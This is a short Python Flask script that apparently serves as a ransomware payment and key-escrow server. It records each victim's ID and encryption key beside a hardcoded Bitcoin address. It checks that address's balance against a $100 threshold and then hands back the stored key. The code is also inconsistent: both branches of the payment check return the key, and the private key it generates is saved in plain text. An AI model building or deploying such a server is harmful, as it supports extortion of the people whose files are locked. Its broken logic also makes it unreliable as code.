from flask import Flask, request
from bitcoin import *

def convert_btc_to_usd(amount):
    response = requests.get('https://api.coindesk.com/v1/bpi/currentprice/BTC.json')
    data = response.json()
    rate = data['bpi']['USD']['rate_float']
    return float(amount) * rate

import requests

def get_balance(address):
    response = requests.get(f'https://blockstream.info/api/address/{address}')
    data = response.json()
    balance_satoshi = data['chain_stats']['funded_txo_sum'] - data['chain_stats']['spent_txo_sum']
    balance_btc = balance_satoshi / 1e8
    return balance_btc

def search_file(file_name, search_term):
    with open(file_name, 'r') as file:
        for line_number, line in enumerate(file, start=1):
            if search_term in line:
                return line
    return "None"

app = Flask(__name__)

@app.route('/', methods=['POST'])
def receive_data():
    headers = request.headers
    private_key = random_key()
    public_key = privtopub(private_key)
    address = pubtoaddr(public_key)
    id = headers.get("ID")
    key = headers.get("Key")
    if "Check" == key:
        line = search_file("data.txt", id)
        line = line.split(" : ")
        print(line)

        address = line[2]
        balance = get_balance(address)
        usd = convert_btc_to_usd(float(balance))
        if usd >= 100:
            return {"Status": "OK", "Info": line[1]}
        else:
            return {"Status": "OK", "Info": line[1]}
    else:
        with open("data.txt", "a") as data:
            print('New "Client": ' + id)
            data.write(id + " : " + key + " : " + "bc1qkhsq748zurna0dyvrvxrll4pch66s9cxhycja4" + " : " + public_key + " : " + private_key + "\n")
    return {"Addr": address}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=555)
